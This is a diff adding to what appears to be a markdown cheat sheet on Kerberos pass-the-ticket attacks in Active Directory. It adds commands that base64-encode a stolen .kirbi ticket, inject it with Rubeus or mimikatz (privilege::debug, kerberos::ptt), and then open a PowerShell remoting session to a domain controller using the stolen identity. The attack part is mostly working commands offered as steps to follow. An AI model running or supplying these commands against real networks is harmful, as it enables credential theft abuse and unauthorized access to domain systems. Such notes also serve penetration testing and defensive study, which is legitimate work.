@@ -111,13 +111,40 @@ Rubeus.exe ptt /ticket:<kirbi_file_name>
 
 ###### b) using `.kirbi` BASE64 METHOD
 
+- converting the `.kirbi` file contents to **base64**.
+
 ```powershell
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("<kirbi_file_name>"))
 ```
 
+- executing the pass the ticket using `.kirbi` file's contents as **base64**.
+
 ```cmd
 Rubeus.exe ptt /ticket:<kirbi_BASE64_text>
 ```
+
+---
+#### STEP 3 : PowerShell Remoting (Pass the Ticket) REMOTE 
+
+##### via `mimikatz`
+
+```cmd
+privilege::debug
+kerberos::ptt "<path to .kirbi file of that user>\<kirbi_filename>"
+```
+
+- After this works, you can log into that **Domain Controller** using `powershell`.
+- This can be a domain controller for this scenario but its just a computer name given to that machine in that particular network. 
+- After passing the ticket you have gained the privilege to access that account probably so you can use that privilege to log inside that network.
+
+```powershell
+Enter-PSSession -ComputerName <Domain_Controller_Name>
+```
+
+---
+
+
+
 
 
 
